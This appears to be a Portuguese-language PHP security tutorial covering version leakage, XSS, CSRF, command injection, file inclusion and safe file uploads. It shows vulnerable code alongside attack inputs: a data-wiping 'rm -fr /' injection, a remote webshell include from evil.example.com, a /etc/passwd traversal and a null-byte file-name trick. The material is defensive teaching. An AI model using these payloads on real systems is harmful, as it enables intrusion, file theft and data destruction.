Vazamento de versão do PHP #

Por padrão, o PHP dirá ao mundo qual versão do PHP você está usando, por exemplo.

X-Powered-By: PHP/5.3.8

Para corrigir isso, você pode alterar o php.ini:

expose_php = off

Ou altere o cabeçalho:

header("X-Powered-By: Magic");

Ou se você preferir um método htaccess:

Header unset X-Powered-By

Se um dos métodos acima não funcionar, há também a função header_remove() que fornece a capacidade de remover o cabeçalho:

header_remove('X-Powered-By');

Se os invasores souberem que você está usando PHP e a versão do PHP que você está usando, será mais fácil para eles explorarem seu servidor.

Script entre sites (XSS) #

Problema #

Cross-site scripting é a execução não intencional de código remoto por um cliente web. Qualquer aplicativo da web pode se expor ao XSS se receber a entrada de um usuário e enviá-la diretamente em uma página da web. Se a entrada incluir HTML ou JavaScript, o código remoto poderá ser executado quando esse conteúdo for renderizado pelo cliente da web.

Por exemplo, se um lado de terceiros contiver um arquivo JavaScript:

// http://example.com/runme.js
document.write("I'm running");

E um aplicativo PHP produz diretamente uma string passada para ele:

<?php
echo '<div>' . $_GET['input'] . '</div>';

Se um parâmetro GET desmarcado contiver <script src="http://example.com/runme.js"></script>, a saída do script PHP será:

<div><script src="http://example.com/runme.js"></script></div>

O JavaScript de terceiros será executado e o usuário verá “Estou executando” na página da web.

Solução #

Como regra geral, nunca confie na entrada de um cliente. Cada valor GET, POST e cookie pode ser qualquer coisa e, portanto, deve ser validado. Ao emitir qualquer um desses valores, escape-os para que não sejam avaliados de maneira inesperada.

Tenha em mente que mesmo nos aplicativos mais simples os dados podem ser movidos e será difícil acompanhar todas as fontes. Portanto, é uma prática recomendada sempre escapar da saída.

O PHP fornece algumas maneiras de escapar da saída dependendo do contexto.

Funções de filtro #

Funções de filtro PHP permitem que os dados de entrada para o script php sejam sanitized ou validated de várias maneiras. Eles são úteis ao salvar ou enviar a entrada do cliente.

Codificação HTML #

htmlspecialchars converterá quaisquer “caracteres especiais HTML” em suas codificações HTML, o que significa que eles não serão processados ​​como HTML padrão. Para corrigir nosso exemplo anterior usando este método:

<?php
echo '<div>' . htmlspecialchars($_GET['input']) . '</div>';
// or
echo '<div>' . filter_input(INPUT_GET, 'input', FILTER_SANITIZE_SPECIAL_CHARS) . '</div>';

Produziria:

<div>&lt;script src=&quot;http://example.com/runme.js&quot;&gt;&lt;/script&gt;</div>

Tudo dentro da tag <div> não será interpretado como uma tag JavaScript pelo navegador, mas sim como um simples nó de texto. O usuário verá com segurança:

<script src="http://example.com/runme.js"></script>

Codificação de URL #

Ao gerar um URL gerado dinamicamente, o PHP fornece a função urlencode para gerar URLs válidos com segurança. Assim, por exemplo, se um usuário puder inserir dados que se tornem parte de outro parâmetro GET:

<?php
$input = urlencode($_GET['input']);
// or
$input = filter_input(INPUT_GET, 'input', FILTER_SANITIZE_URL);
echo '<a href="http://example.com/page?input="' . $input . '">Link</a>';

Qualquer entrada maliciosa será convertida em um parâmetro de URL codificado.

Usando bibliotecas externas especializadas ou listas OWASP AntiSamy #

Às vezes você vai querer enviar HTML ou outro tipo de entrada de código. Você precisará manter uma lista de palavras autorizadas (lista branca) e não autorizadas (lista negra).

Você pode baixar listas padrão disponíveis no site do OWASP AntiSamy. Cada lista é adequada para um tipo específico de interação (ebay api, tinyMCE, etc…). E é de código aberto.

Existem bibliotecas existentes para filtrar HTML e evitar ataques XSS para o caso geral e executar pelo menos tão bem quanto as listas AntiSamy com uso muito fácil. Por exemplo, você tem purificador HTML

Falsificação de solicitação entre sites #

Problema #

Cross-Site Request Forgery ou CSRF pode forçar um usuário final a gerar inconscientemente solicitações maliciosas para um servidor web. Esse vetor de ataque pode ser explorado em solicitações POST e GET. Digamos, por exemplo, que o ponto final de url /delete.php?accnt=12 exclua a conta conforme passado do parâmetro accnt de uma solicitação GET. Agora, se um usuário autenticado encontrar o seguinte script em qualquer outro aplicativo

<img src="http://domain.com/delete.php?accnt=12" width="0" height="0" border="0">

a conta seria deletada.

Solução #

Uma solução comum para esse problema é o uso de tokens CSRF. Os tokens CSRF são incorporados às solicitações para que um aplicativo da Web possa confiar que uma solicitação veio de uma fonte esperada como parte do fluxo de trabalho normal do aplicativo. Primeiro, o usuário executa alguma ação, como visualizar um formulário, que aciona a criação de um token exclusivo. Um formulário de exemplo que implementa isso pode parecer

<form method="get" action="/delete.php">
  <input type="text" name="accnt" placeholder="accnt number" />
  <input type="hidden" name="csrf_token" value="<randomToken>" />
  <input type="submit" />
</form>

O token pode então ser validado pelo servidor em relação à sessão do usuário após o envio do formulário para eliminar solicitações maliciosas.

Código de amostra #

Aqui está o código de exemplo para uma implementação básica:

/* Code to generate a CSRF token and store the same */
...
<?php
  session_start();
  function generate_token() {
    // Check if a token is present for the current session
    if(!isset($_SESSION["csrf_token"])) {
        // No token present, generate a new one
        $token = random_bytes(64);
        $_SESSION["csrf_token"] = $token;
    } else {
        // Reuse the token
        $token = $_SESSION["csrf_token"];
    }
    return $token;
  }
?>
<body>
  <form method="get" action="/delete.php">
    <input type="text" name="accnt" placeholder="accnt number" />
    <input type="hidden" name="csrf_token" value="<?php echo generate_token();?>" />
    <input type="submit" />
  </form>
</body>
...


/* Code to validate token and drop malicious requests */
...
<?php
  session_start();
  if ($_GET["csrf_token"] != $_SESSION["csrf_token"]) {
    // Reset token
    unset($_SESSION["csrf_token"]);
    die("CSRF token validation failed");
  }
?>
...

Existem muitas bibliotecas e frameworks já disponíveis que possuem sua própria implementação de validação CSRF. Embora esta seja a implementação simples do CSRF, você precisa escrever algum código para regenerar seu token CSRF dinamicamente para evitar o roubo e a fixação do token CSRF.

Injeção de linha de comando #

Problema #

Da mesma forma que a injeção de SQL permite que um invasor execute consultas arbitrárias em um banco de dados, a injeção de linha de comando permite que alguém execute comandos de sistema não confiáveis ​​em um servidor web. Com um servidor protegido incorretamente, isso daria ao invasor controle total sobre um sistema.

Digamos, por exemplo, que um script permite que um usuário liste o conteúdo do diretório em um servidor web.

<pre>
<?php system('ls ' . $_GET['path']); ?>
</pre>

(Em uma aplicação do mundo real, pode-se usar funções ou objetos internos do PHP para obter o conteúdo do caminho. Este exemplo é para uma demonstração simples de segurança.)

Seria de esperar obter um parâmetro path semelhante a /tmp. Mas como qualquer entrada é permitida, path pode ser ; rm -fr /. O servidor web então executaria o comando

ls; rm -fr /

e tente excluir todos os arquivos da raiz do servidor.

Solução #

Todos os argumentos de comando devem ser escapados usando escapeshellarg() ou escapeshellcmd(). Isso torna os argumentos não executáveis. Para cada parâmetro, o valor de entrada também deve ser validado.

No caso mais simples, podemos proteger nosso exemplo com

<pre>
<?php system('ls ' . escapeshellarg($_GET['path'])); ?>
</pre>

Seguindo o exemplo anterior com a tentativa de remover os arquivos, o comando executado se torna

ls '; rm -fr /'

E a string é simplesmente passada como um parâmetro para ls, ao invés de terminar o comando ls e executar rm.

Deve-se notar que o exemplo acima agora é seguro da injeção de comando, mas não da passagem de diretório. Para corrigir isso, deve-se verificar se o caminho normalizado começa com o subdiretório desejado.

O PHP oferece uma variedade de funções para executar comandos do sistema, incluindo exec, passthru, proc_open, shell_exec e system. Todos devem ter suas entradas cuidadosamente validadas e escapadas.

Relatório de erros #

Por padrão, o PHP exibirá mensagens de erros, avisos e aviso diretamente na página se ocorrer algo inesperado em um script. Isso é útil para resolver problemas específicos com um script, mas ao mesmo tempo gera informações que você não deseja que seus usuários saibam.

Portanto, é uma boa prática evitar a exibição de mensagens que revelarão informações sobre seu servidor, como sua árvore de diretórios, por exemplo, em ambientes de produção. Em um ambiente de desenvolvimento ou teste, essas mensagens ainda podem ser úteis para serem exibidas para fins de depuração.

Uma solução rápida #

Você pode desativá-los para que as mensagens não apareçam, mas isso dificulta a depuração do seu script.

<?php
  ini_set("display_errors", "0");
?>

Ou altere-os diretamente no php.ini.

display_errors = 0

Tratamento de erros #

Uma opção melhor seria armazenar essas mensagens de erro em um local mais útil, como um banco de dados:

set_error_handler(function($errno , $errstr, $errfile, $errline){
  try{
    $pdo = new PDO("mysql:host=hostname;dbname=databasename", 'dbuser', 'dbpwd', [
      PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ]);

    if($stmt = $pdo->prepare("INSERT INTO `errors` (no,msg,file,line) VALUES (?,?,?,?)")){
      if(!$stmt->execute([$errno, $errstr, $errfile, $errline])){
        throw new Exception('Unable to execute query');
      }
    } else {
      throw new Exception('Unable to prepare query');
    }
  } catch (Exception $e){
    error_log('Exception: ' . $e->getMessage() . PHP_EOL . "$errfile:$errline:$errno | $errstr");
  }
});

Esse método registrará as mensagens no banco de dados e, se isso falhar, em um arquivo em vez de ecoá-lo diretamente na página. Dessa forma, você pode acompanhar o que os usuários estão experimentando em seu site e notificá-lo imediatamente se algo der errado.

Inclusão de arquivo #

Inclusão de arquivo remoto #

A inclusão de arquivo remoto (também conhecida como RFI) é um tipo de vulnerabilidade que permite que um invasor inclua um arquivo remoto.

Este exemplo injeta um arquivo hospedado remotamente contendo um código malicioso:

<?php
include $_GET['page'];

/vulnerable.php?page=http://evil.example.com/webshell.txt?

Inclusão de arquivo local #

A inclusão de arquivos locais (também conhecida como LFI) é o processo de inclusão de arquivos em um servidor por meio do navegador da web.

<?php
$page = 'pages/'.$_GET['page'];
if(isset($page)) {
    include $page;
} else {
    include 'index.php';
}

/vulnerable.php?page=../../../../etc/passwd

Solução para RFI e LFI: #

É recomendável permitir apenas a inclusão de arquivos que você aprovou e limitar apenas a eles.

<?php
$page = 'pages/'.$_GET['page'].'.php';
$allowed = ['pages/home.php','pages/error.php'];
if(in_array($page,$allowed)) {
    include($page);
} else {
    include('index.php');
}

Tirando Tags #

strip_tags é uma função muito poderosa se você souber como usá-la. Como um método para evitar ataques de script entre sites, existem métodos melhores, como codificação de caracteres, mas remover tags é útil em alguns casos.

Exemplo básico #

$string = '<b>Hello,<> please remove the <> tags.</b>';

echo strip_tags($string);

Saída bruta

Hello, please remove the tags.

Permitindo Tags #

Digamos que você queira permitir uma determinada tag, mas nenhuma outra tag, então você especificaria isso no segundo parâmetro da função. Este parâmetro é opcional. No meu caso eu só quero que a tag <b> seja passada.

$string = '<b>Hello,<> please remove the <br> tags.</b>';

echo strip_tags($string, '<b>');

Saída bruta

<b>Hello, please remove the  tags.</b>

Aviso(s) #

Comentários HTML e tags PHP também são removidos. Isso é codificado e não pode ser alterado com allowable_tags.

No PHP 5.3.4 e posteriores, tags XHTML de fechamento automático são ignoradas e somente tags não fechadas devem ser usadas em tags_permissíveis. Por exemplo, para permitir <br> e <br/>, você deve usar:

<?php
strip_tags($input, '<br>');
?>

1: https://www.wikiod.com/pt/php/seguranca#Script entre sites (XSS)

Carregando arquivos #

Se você quiser que os usuários carreguem arquivos para o seu servidor, você precisa fazer algumas verificações de segurança antes de realmente mover o arquivo carregado para o seu diretório web.

Os dados carregados: #

Esta matriz contém usuário dados enviados e não informações sobre o próprio arquivo. Embora geralmente esses dados sejam gerados pelo navegador, pode-se facilmente fazer uma solicitação de postagem para o mesmo formulário usando o software.

$_FILES['file']['name'];
$_FILES['file']['type'];
$_FILES['file']['size'];
$_FILES['file']['tmp_name'];
  • name - Verifique todos os aspectos dele.
  • type - Nunca use esses dados. Ele pode ser obtido usando funções PHP.
  • size - Seguro de usar.
  • tmp_name - Seguro de usar.

Explorando o nome do arquivo #

Normalmente, o sistema operacional não permite caracteres específicos em um nome de arquivo, mas falsificando a solicitação, você pode adicioná-los, permitindo que coisas inesperadas aconteçam. Por exemplo, vamos nomear o arquivo:

../script.php%00.png

Dê uma boa olhada no nome do arquivo e você deve notar algumas coisas.

  1. O primeiro a notar é o ../, totalmente ilegal em um nome de arquivo e ao mesmo tempo perfeitamente correto se você estiver movendo um arquivo de um diretório para outro, o que vamos fazer certo?
  2. Agora você pode pensar que estava verificando as extensões de arquivo corretamente em seu script, mas este exploit depende da decodificação de url, traduzindo %00 para um caractere null, basicamente dizendo ao sistema operacional, esta string termina aqui, removendo off .png fora do nome do arquivo.

Então agora eu carreguei script.php para outro diretório, ignorando validações simples para extensões de arquivo. Ele também ignora os arquivos .htaccess não permitindo que scripts sejam executados de dentro do seu diretório de upload.

Obtendo o nome e a extensão do arquivo com segurança #

Você pode usar pathinfo() para extrapolar o nome e a extensão de maneira segura, mas primeiro precisamos substituir os caracteres indesejados no arquivo nome:

// This array contains a list of characters not allowed in a filename
$illegal   = array_merge(array_map('chr', range(0,31)), ["<", ">", ":", '"', "/", "\\", "|", "?", "*", " "]);
$filename  = str_replace($illegal, "-", $_FILES['file']['name']);

$pathinfo  = pathinfo($filename);
$extension = $pathinfo['extension'] ? $pathinfo['extension']:'';
$filename  = $pathinfo['filename']  ? $pathinfo['filename']:'';

if(!empty($extension) && !empty($filename)){
  echo $filename, $extension;
} else {
  die('file is missing an extension or name');
}

Embora agora tenhamos um nome de arquivo e extensão que podem ser usados ​​para armazenamento, ainda prefiro armazenar essas informações em um banco de dados e dar a esse arquivo um nome gerado de, por exemplo, md5(uniqid().microtime())

+----+--------+-----------+------------+------+----------------------------------+---------------------+
| id | title  | extension | mime       | size | filename                         | time                |
+----+--------+-----------+------------+------+----------------------------------+---------------------+
| 1  | myfile | txt       | text/plain | 1020 | 5bcdaeddbfbd2810fa1b6f3118804d66 | 2017-03-11 00:38:54 |
+----+--------+-----------+------------+------+----------------------------------+---------------------+

Isso resolveria o problema de nomes de arquivos duplicados e explorações imprevistas no nome do arquivo. Isso também faria com que o invasor adivinhasse onde esse arquivo foi armazenado, pois ele não pode direcioná-lo especificamente para execução.

Validação do tipo Mime #

Verificar uma extensão de arquivo para determinar qual arquivo é não é suficiente, pois um arquivo pode ser chamado de image.png, mas pode muito bem conter um script php. Ao verificar o tipo mime do arquivo enviado em relação a uma extensão de arquivo, você pode verificar se o arquivo contém a que seu nome se refere.

Você pode até dar um passo adiante para validar imagens, e isso é realmente abri-las:

if($mime == 'image/jpeg' && $extension == 'jpeg' || $extension == 'jpg'){
  if($img = imagecreatefromjpeg($filename)){
    imagedestroy($img);
  } else {
    die('image failed to open, could be corrupt or the file contains something else.');
  }
}

Você pode buscar o tipo mime usando uma função ou uma [class](http://php. net/manual/en/book.fileinfo.php).

Lista branca de seus uploads #

Mais importante, você deve incluir extensões de arquivo e tipos MIME na lista de permissões, dependendo de cada formulário.

function isFiletypeAllowed($extension, $mime, array $allowed)
{
    return  isset($allowed[$mime]) &&
            is_array($allowed[$mime]) &&
            in_array($extension, $allowed[$mime]);
}

$allowedFiletypes = [
    'image/png'  => [ 'png' ],
    'image/gif'  => [ 'gif' ],
    'image/jpeg' => [ 'jpg', 'jpeg' ],
];

var_dump(isFiletypeAllowed('jpg', 'image/jpeg', $allowedFiletypes));
